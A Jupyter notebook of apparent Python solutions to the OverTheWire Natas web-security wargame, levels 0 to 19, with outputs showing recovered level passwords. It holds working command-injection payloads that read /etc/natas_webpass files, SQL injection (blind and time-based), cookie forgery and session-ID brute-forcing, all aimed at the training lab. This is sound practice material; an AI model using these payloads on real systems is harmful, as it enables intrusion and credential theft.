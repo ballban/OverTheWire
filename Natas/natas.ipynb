{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import yaml\n",
    "import re\n",
    "import base64\n",
    "import urllib.parse\n",
    "from IPython.display import clear_output, HTML\n",
    "import threading\n",
    "import time\n",
    "\n",
    "pwd = None\n",
    "count = 0\n",
    "natas = auth = url = None\n",
    "ALPHANUMERIC_CHARACTERS = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n",
    "\n",
    "def get_pwd():\n",
    "    global pwd\n",
    "    with open('password.yml', 'r') as f:\n",
    "        pwd = yaml.safe_load(f)\n",
    "\n",
    "def save_pwd(id, pw):\n",
    "    global pwd\n",
    "    with open('password.yml', 'w') as f:\n",
    "        pwd[id] = pw\n",
    "        yaml.dump(pwd, f)\n",
    "\n",
    "def find_pwd(res):\n",
    "    global count\n",
    "    pattern = r'[\\w\\d]{32}'\n",
    "    mat = re.findall(pattern, res.text)\n",
    "    natas = f'natas{count}'\n",
    "    if mat:\n",
    "        for m in mat:\n",
    "            if m != pwd[natas]:\n",
    "                print(f'password found: f{m}')\n",
    "                save_pwd(f'natas{count + 1}', m)\n",
    "                return True\n",
    "    \n",
    "    print(f'password not found.')\n",
    "    print(res.text)\n",
    "    return False\n",
    "\n",
    "def run_task(task, count=5):\n",
    "    thread_list = []\n",
    "    for _ in range(count):\n",
    "        thread_list.append(threading.Thread(target=task))\n",
    "    for thread in thread_list:\n",
    "        thread.start()\n",
    "    for thread in thread_list:\n",
    "        thread.join()\n",
    "\n",
    "def init():\n",
    "    global count, natas, auth, url\n",
    "    get_pwd()\n",
    "    natas = f'natas{count}'\n",
    "    auth = (natas, pwd[natas])\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas0\n",
    "count = 0\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fTguMNxKo1DSa1tujBLuZJnDUlCcUAPlI\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas1\n",
    "count = 1\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas2\n",
    "count = 2\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/files/users.txt'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fQryZXc2e0zahULdHrtHxzyYkj59kUxLQ\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas3\n",
    "count = 3\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/s3cr3t/users.txt'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0n35PkggAPm2zbEpOU802c0x0Msn1ToK\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas4\n",
    "count = 4\n",
    "init()\n",
    "\n",
    "header = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), headers=header)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0RoJwHdSKWFTYR5WuiAewauSuNaBXned\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas5\n",
    "count = 5\n",
    "init()\n",
    "\n",
    "cookies = {'loggedin': '1'}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<?\n",
      "$secret = \"FOEIUWGHFEEUHOFUOIU\";\n",
      "?>\n",
      "\n",
      "password found: fbmg8SvU1LizuWjx3y7xkNERkHxGre0GS\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas6\n",
    "count = 6\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/includes/secret.inc'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(res.text)\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "data = {\"secret\": \"FOEIUWGHFEEUHOFUOIU\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fxcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas7\n",
    "count = 7\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "secret: oubWYf2kBq\n",
      "password found: fZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas8\n",
    "count = 8\n",
    "\n",
    "encodedSecret = \"3d3d516343746d4d6d6c315669563362\"\n",
    "secret = base64.decodebytes(bytes.fromhex(encodedSecret)[::-1]).decode()\n",
    "print(f'secret: {secret}')\n",
    "\n",
    "init()\n",
    "data = {'secret': secret, 'submit': 'submit'}\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas9"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ft7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas9\n",
    "count = 9\n",
    "\n",
    "#1 dictionary.txt; find / -type d -name \"natas*\";\n",
    "#1 dictionary.txt; ls /etc/natas_webpass;\n",
    "#1 dictionary.txt; cat /etc/natas_webpass/natas10;\n",
    "needle = \"1 dictionary.txt; cat /etc/natas_webpass/natas10;\"\n",
    "\n",
    "init()\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas10"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fUJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas10\n",
    "count = 10\n",
    "needle = \" -e '.' /etc/natas_webpass/* #\"\n",
    "\n",
    "init()\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas11"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D'}\n",
      "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=\n",
      "a: b'\\x1ef$\\x07\\n3\\'\\x0e\\x167 \\x00\\x17 uUG*8MIf5\\x08\\x06+;\\x00\\x17fmMF\"1\\t\\x03\"1M\\x18'\n",
      "b: b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
      "key: [101, 68, 87, 111]\n",
      "cookie: [30, 102, 36, 7, 10, 51, 39, 14, 22, 55, 32, 0, 23, 32, 117, 85, 71, 61, 50, 28, 71, 104, 117, 13, 2, 39, 56, 3, 10, 54, 117, 85, 71, 103, 49, 9, 3, 34, 49, 9, 71, 57]\n",
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5'}\n",
      "password found: fyZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas11\n",
    "count = 11\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = {}\n",
    "for cookie in res.cookies:\n",
    "    cookies[cookie.name] = cookie.value\n",
    "print(cookies)\n",
    "\n",
    "a = urllib.parse.unquote(cookies['data'])\n",
    "print(a)\n",
    "a = base64.b64decode(a)\n",
    "b = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
    "print(f'a: {a}')\n",
    "print(f'b: {b}')\n",
    "\n",
    "key = []\n",
    "for i in range(len(b)):\n",
    "    key += [b[i] ^ a[i]]\n",
    "key = key[:4]\n",
    "print(f'key: {key}')\n",
    "\n",
    "text = b'{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}'\n",
    "cookie = []\n",
    "for i in range(len(text)):\n",
    "    cookie += [text[i] ^ key[i % len(key)]]\n",
    "print(f\"cookie: {cookie}\")\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "cookies['data'] = base64.b64encode(bytes(cookie)).decode()\n",
    "print(cookies)\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas12"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ftrbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC\n"
     ]
    }
   ],
   "source": [
    "# natas12\n",
    "count = 12\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "files = {\"uploadedfile\": ('natas12.php', open('natas12.php', 'rb'), 'multipart/form-data')}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r'upload\\/[\\w\\d]{10}\\.php'\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/{mat[0]}'\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res)\n",
    "else:\n",
    "    print('not found.')\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas13"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fz3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ\n"
     ]
    }
   ],
   "source": [
    "# natas13\n",
    "count = 13\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "files = {\"uploadedfile\": ('natas13.php', open('natas13.php', 'rb'), 'multipart/form-data')}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r'upload\\/[\\w\\d]{10}\\.php'\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/{mat[0]}'\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res)\n",
    "else:\n",
    "    print('not found.')\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas14"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fSdqIqBsFcz3yotlNYErZSZwblkm0lrvx\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas14\n",
    "count = 14\n",
    "init()\n",
    "\n",
    "username = 'natas15\";#'\n",
    "password = \"123\"\n",
    "url = f'http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}&debug=0'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas15"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# natas15\n",
    "count = 15\n",
    "init()\n",
    "\n",
    "def try_inject(username):\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    return \"This user exists.\" in result\n",
    "\n",
    "username = 'natas16\" and BINARY password like \"'\n",
    "password = \"\"\n",
    "\n",
    "current_char_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "def task():\n",
    "    global current_char_list, password\n",
    "    while len(password) < 32:\n",
    "        c = current_char_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(f\"{username}{password}{c}%\"):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_char_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "run_task(task)\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas16\", password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas16"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bhjkoqsvwCEFHJLNOT05789\n"
     ]
    }
   ],
   "source": [
    "#natas16\n",
    "count = 16\n",
    "init()\n",
    "\n",
    "# get all characters in the password\n",
    "key_list = []\n",
    "for c in ALPHANUMERIC_CHARACTERS:\n",
    "    command = \"$(grep -oh {0} /etc/natas_webpass/natas17)\".format(c)\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "    response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    if len(response.text) != 461926:\n",
    "        print(c, len(response.text))\n",
    "        key_list.append(c)\n",
    "\n",
    "key_list = \"\".join(key_list)\n",
    "clear_output()\n",
    "print(key_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\n",
      "--------------------------------------------------\n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name 'password' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[3], line 29\u001b[0m\n\u001b[0;32m     27\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mpassword found: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mkey\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m     28\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m-\u001b[39m\u001b[38;5;124m\"\u001b[39m \u001b[38;5;241m*\u001b[39m \u001b[38;5;241m50\u001b[39m)\n\u001b[1;32m---> 29\u001b[0m save_pwd(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mnatas17\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[43mpassword\u001b[49m)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'password' is not defined"
     ]
    }
   ],
   "source": [
    "# get all characters in the password\n",
    "key = \"\"\n",
    "current_key_list = [x for x in key_list]\n",
    "\n",
    "def task():\n",
    "    global key, current_key_list\n",
    "    while len(key) < 32:\n",
    "        if len(current_key_list) == 0:\n",
    "            return\n",
    "        c = current_key_list.pop()\n",
    "        new_key = key + c\n",
    "        print(f\"trying: {new_key}\")\n",
    "        command = \"$(grep -oh ^{0} /etc/natas_webpass/natas17)\".format(new_key)\n",
    "        url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "        response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "        if len(response.text) != 461926:\n",
    "            clear_output()\n",
    "            key = new_key\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {key}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_key_list = [x for x in key_list]\n",
    "\n",
    "run_task(task)\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {key}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas17\", key)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas17"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "--------------------------------------------------\n",
      "Response time: 0.581000566482544\n",
      "Response time: 0.5825009346008301\n",
      "trying 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ9\n",
      "trying 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ8\n",
      "Response time: 0.5855011940002441\n",
      "Response time: 0.6174988746643066\n",
      "--------------------------------------------------\n",
      "password found: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "#natas17\n",
    "count = 17\n",
    "init()\n",
    "\n",
    "def try_inject(sql):\n",
    "    # print(sql)\n",
    "    t1 = time.time()\n",
    "    url = f\"http://natas17.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(sql)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    t2 = time.time() - t1\n",
    "    print(f\"Response time: {t2}\")\n",
    "    if t2 > 5:\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "\n",
    "sql = \"natas18\\\" and BINARY password like \\\"{0}{1}%\\\" AND SLEEP(5)=0 #\"\n",
    "password = \"\"\n",
    "current_key_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "def task():\n",
    "    global password, current_key_list\n",
    "    while len(password) < 32:\n",
    "        if len(current_key_list) == 0:\n",
    "            time.sleep(6)\n",
    "            if len(current_key_list) == 0:\n",
    "                return\n",
    "        c = current_key_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(sql.format(password, c)):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_key_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "run_task(task)\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas18\", password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas18"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1051\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas18\", \"pass\": \"6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\" };</script></head>\n",
      "<body>\n",
      "<h1>natas18</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19\n",
      "Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: ftnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\n"
     ]
    }
   ],
   "source": [
    "#natas18\n",
    "count = 18\n",
    "init()\n",
    "\n",
    "url = f'http://natas18.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test'\n",
    "\n",
    "i = -1\n",
    "def task():\n",
    "    global i\n",
    "    while 'natas19' not in pwd:\n",
    "        i += 1\n",
    "        print(f'testing session id {i}')\n",
    "        cookies = dict(PHPSESSID=str(i))\n",
    "        result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "        if 'Username: natas19' in result.text:\n",
    "            clear_output()\n",
    "            print(len(result.text))\n",
    "            print(result.text)\n",
    "            find_pwd(result)\n",
    "            break\n",
    "\n",
    "run_task(task)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas19"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found. session id: 285, key: 3238312d61646d696e\n",
      "1097\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas19\", \"pass\": \"tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\" };</script></head>\n",
      "<body>\n",
      "<h1>natas19</h1>\n",
      "<div id=\"content\">\n",
      "<p>\n",
      "<b>\n",
      "This page uses mostly the same code as the previous level, but session IDs are no longer sequential...\n",
      "</b>\n",
      "</p>\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20\n",
      "Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fp5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\n",
      "testing session id 285, key: 3238322d61646d696e\n",
      "testing session id 285, key: 3238332d61646d696e\n",
      "testing session id 285, key: 3238352d61646d696e\n",
      "testing session id 285, key: 3238342d61646d696e\n"
     ]
    }
   ],
   "source": [
    "#natas19\n",
    "count = 19\n",
    "init()\n",
    "\n",
    "url = f'http://natas19.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test'\n",
    "i = -1\n",
    "def task():\n",
    "    global i\n",
    "    while 'natas20' not in pwd:\n",
    "        i += 1\n",
    "        key = f'{i}-admin'.encode('utf-8').hex()\n",
    "        cookies = dict(PHPSESSID=key)\n",
    "        result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "        if 'Username: natas20' in result.text:\n",
    "            clear_output()\n",
    "            print(f'password found. session id: {i}, key: {key}')\n",
    "            print(len(result.text))\n",
    "            print(result.text)\n",
    "            find_pwd(result)\n",
    "            break\n",
    "        print(f'testing session id {i}, key: {key}')\n",
    "\n",
    "run_task(task)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
